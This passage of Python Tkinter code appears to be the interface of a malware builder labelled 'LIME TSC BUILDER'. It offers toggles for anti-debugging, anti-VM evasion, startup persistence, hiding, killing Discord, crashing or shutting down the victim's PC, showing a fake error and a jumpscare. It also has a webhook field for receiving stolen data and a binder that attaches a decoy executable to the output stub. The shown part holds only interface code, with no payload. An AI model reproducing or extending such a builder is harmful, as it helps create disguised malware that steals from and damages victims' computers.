    def checkfakeerrorbu():
        if FAKEERROR == True:
            fakeerrorbu.configure(image=BUTTON_YES)
        else:
            fakeerrorbu.configure(image=BUTTON_NO)

    
    fakeerrorbu = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=fakeerror_image, textvariable=FAKEERROR_VAR)
    fakeerrorbu.place(x=600, y=330)
    checkfakeerrorbu()

    fakeerroren = Entry(root, width=43,  bg="#161716", bd=0, fg="#ffffff", highlightthickness=0, highlightcolor="#161716", highlightbackground="#161716",font=("Helvetica", 10), textvariable=FAKEERROR_MESSAGE)
    fakeerroren.place(x=380, y=381, height=39)

    def binder_image():
        global BINDER
        if BINDER == False:
            binderbu.configure(image=BUTTON_YES)
            BINDER = True
        else:
            BINDER = False
            binderbu.configure(image=BUTTON_NO)

    def checkbinderbu():
        if BINDER == True:
            binderbu.configure(image=BUTTON_YES)
        else:
            binderbu.configure(image=BUTTON_NO)

    binderbu = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=binder_image, textvariable=BINDER_VAR)
    binderbu.place(x=300, y=80)
    checkbinderbu()

    selectappbu = Button(root, image=browse, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716",command=add_app)
    selectappbu.place(x=200, y=200)






def aboutme():
    compilermenuimage = Label(root, image=aboutmenu).place(x=-2, y=-2)
    
    menub = Button(root,bd=0, highlightthickness=0, image=menuoff, command=menu).place(x=0, y=150)

    compileb = Button(root,bd=0, highlightthickness=0, image=compoff, command=compilermenu).place(x=0, y=200)
    
    aboutb = Button(root,bd=0, highlightthickness=0, image=abouton, command=aboutme).place(x=0, y=250)

    buildbu = Button(root,bd=0, highlightthickness=0, image=buildb, command=builder).place(x=0, y=350)

    def opendiscord():
        webbrowser.open(get_our_links["SERVERS"])
    discordad = Button(root,bd=0, highlightthickness=0, image=discord_button, command=opendiscord,bg="#161716",activebackground="#161716", borderwidth=0).place(x=290, y=350)

    def openyoutube():
        webbrowser.open("https://github.com/fadi002")

    youtubead = Button(root,bd=0, highlightthickness=0, image=youtube_button, command=openyoutube,bg="#161716",activebackground="#161716", borderwidth=0).place(x=450, y=350)

    def openwebsite():
        webbrowser.open(get_our_links['WEBSITE'])
 
    websitead = Button(root,bd=0, highlightthickness=0, image=website_button, command=openwebsite,bg="#161716",activebackground="#161716", borderwidth=0).place(x=370, y=350)



def menu():
    background_label = Label(root, image=background_image)
    background_label.place(x=-2, y=-2)
    def anti_debug_image():
        global ANTI_DEBUG
        if ANTI_DEBUG == False:
            button_anti_debug.configure(image=BUTTON_YES)
            ANTI_DEBUG = True
        else:
            ANTI_DEBUG = False
            button_anti_debug.configure(image=BUTTON_NO)
    
    def checkanti_debug():
        if ANTI_DEBUG == True:
            button_anti_debug.configure(image=BUTTON_YES)
        else:
            button_anti_debug.configure(image=BUTTON_NO)

    
    button_anti_debug = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=anti_debug_image, textvariable=ANTI_DEBUG_VAR)
    button_anti_debug.place(x=300, y=230)
    checkanti_debug()
    

    def checkanti_vm():
        if ANTI_VM == True:
            button_anti_vm.configure(image=BUTTON_YES)
        else:
            button_anti_vm.configure(image=BUTTON_NO)


    def anti_vm_image():
        global ANTI_VM
        if ANTI_VM == False:
            button_anti_vm.configure(image=BUTTON_YES)
            ANTI_VM = True
        else:
            ANTI_VM = False
            button_anti_vm.configure(image=BUTTON_NO)
    
    
    
    button_anti_vm = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=anti_vm_image,textvariable=ANTI_VM_VAR)
    button_anti_vm.place(x=300, y=280)
    checkanti_vm()
    
    
    
    def startup_image():
        global STARTUP
        if STARTUP == False:
            button_Startup.configure(image=BUTTON_YES)
            STARTUP = True
        else:
            STARTUP = False
            button_Startup.configure(image=BUTTON_NO)
    

    def checkstartup():
        if STARTUP == True:
            button_Startup.configure(image=BUTTON_YES)
        else:
            button_Startup.configure(image=BUTTON_NO)


    button_Startup = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=startup_image, textvariable=STARTUP_VAR)
    button_Startup.place(x=300, y=330)
    checkstartup()







    def checkhidden():
        if HIDDEN == True:
            button_hidden.configure(image=BUTTON_YES)
        else:
            button_hidden.configure(image=BUTTON_NO)

    def hidden_image():
        global HIDDEN
        if HIDDEN == False:
            button_hidden.configure(image=BUTTON_YES)
            HIDDEN = True
        else:
            HIDDEN = False
            button_hidden.configure(image=BUTTON_NO)

    button_hidden = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=hidden_image, textvariable=HIDDEN_VAR)
    button_hidden.place(x=610, y=230)
    checkhidden()
    




    
    def discord_kill_image():
        global DISCORD_KILL
        if DISCORD_KILL == False:
            button_discord_kill.configure(image=BUTTON_YES)
            DISCORD_KILL = True
        else:
            DISCORD_KILL = False
            button_discord_kill.configure(image=BUTTON_NO)
    
    def checkdiscord_kill():
        if DISCORD_KILL == True:
            button_discord_kill.configure(image=BUTTON_YES)
        else:
            button_discord_kill.configure(image=BUTTON_NO)


    button_discord_kill = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=discord_kill_image , textvariable=DISCORD_KILL_VAR)
    button_discord_kill.place(x=300, y=385)
    checkdiscord_kill()
    
    
    
    
    
    
    

    def SHUTDOWN_image():
        global SHUTDOWN
        if SHUTDOWN == False:
            button_shutdown.configure(image=BUTTON_YES)
            SHUTDOWN = True
        else:
            SHUTDOWN = False
            button_shutdown.configure(image=BUTTON_NO)
    
    
    def checkshutdown(): 
        if SHUTDOWN == True:
            button_shutdown.configure(image=BUTTON_YES)
        else:
            button_shutdown.configure(image=BUTTON_NO)

    
    button_shutdown = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=SHUTDOWN_image, textvariable=SHUTDOWN_VAR)
    button_shutdown.place(x=460, y=230)
    checkshutdown()
    
    
    
    def restart_image():
        global RESTART
        if RESTART == False:
            button_restart.configure(image=BUTTON_YES)
            RESTART = True
        else:
            RESTART = False
            button_restart.configure(image=BUTTON_NO)
    
    def checkrestart():
        if RESTART == True:
            button_restart.configure(image=BUTTON_YES)
        else:
            button_restart.configure(image=BUTTON_NO)


    button_restart = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=restart_image, textvariable=RESTART_VAR)
    button_restart.place(x=460, y=280)
    checkrestart()
    

    def CRASH_PC_image():
        global CRASH_PC
        if CRASH_PC == False:
            button_CRASH_PC.configure(image=BUTTON_YES)
            CRASH_PC = True
        else:
            CRASH_PC = False
            button_CRASH_PC.configure(image=BUTTON_NO)
    
    def checkCRASH_PC():
        if CRASH_PC == True:
            button_CRASH_PC.configure(image=BUTTON_YES)
        else:
            button_CRASH_PC.configure(image=BUTTON_NO)


    button_CRASH_PC = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=CRASH_PC_image , textvariable=CRASH_PC_VAR)
    button_CRASH_PC.place(x=460, y=330)
    checkCRASH_PC()
    
    
    
    def JUMPSCARE_image():
        global JUMPSCARE
        if JUMPSCARE == False:
            button_JUMPSCARE.configure(image=BUTTON_YES)
            JUMPSCARE = True
        else:
            JUMPSCARE = False
            button_JUMPSCARE.configure(image=BUTTON_NO)
    
    def checkJUMPSCARE():
        if JUMPSCARE == True:
            button_JUMPSCARE.configure(image=BUTTON_YES)
        else:
            button_JUMPSCARE.configure(image=BUTTON_NO)


    button_JUMPSCARE = Button(root, image=BUTTON_NO, bg="#161716", bd=0 ,relief="sunken" ,activebackground="#161716", command=JUMPSCARE_image)
    button_JUMPSCARE.place(x=460, y=385)
    checkJUMPSCARE()

    webhook_entry = Entry(root, width=73,  bg="#161716", bd=0, fg="#ffffff", highlightthickness=0, highlightcolor="#161716", highlightbackground="#161716",font=("Helvetica", 10),textvariable=webhook)
    webhook_entry.place(x=171, y=141, height=26)
        

    
    menub = Button(root,bd=0, highlightthickness=0, image=menuon).place(x=0, y=150)

    compileb = Button(root,bd=0, highlightthickness=0, image=compoff, command=compilermenu).place(x=0, y=200)
    
    aboutb = Button(root,bd=0, highlightthickness=0, image=aboutoff, command=aboutme).place(x=0, y=250)

    buildbu = Button(root,bd=0, highlightthickness=0, image=buildb, command=builder).place(x=0, y=350)


menu()



shits = []
def add_app():
    try:
        apps_path = filedialog.askopenfilename(initialdir="/",title="SELECT FILE PATH", filetypes=(("executables","*.exe"),("all files","*.*")))
        temppath="output\\stubs\\temp"
        shits.append(apps_path)
        after_payload = shutil.copy2(apps_path,temppath)
        messagebox.showinfo('LIME TSC BUILDER',"DONE BIND THE APP")
    except:
        messagebox.showerror("ERROR","PLEASE SELECT APP")

def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        process = psutil.Process(os.getpid())
        for child in process.children(recursive=True):
            child.kill()
        process.kill()
        sys.exit()
try:
    root.protocol("WM_DELETE_WINDOW", on_closing)
except:
    pass

root.mainloop()



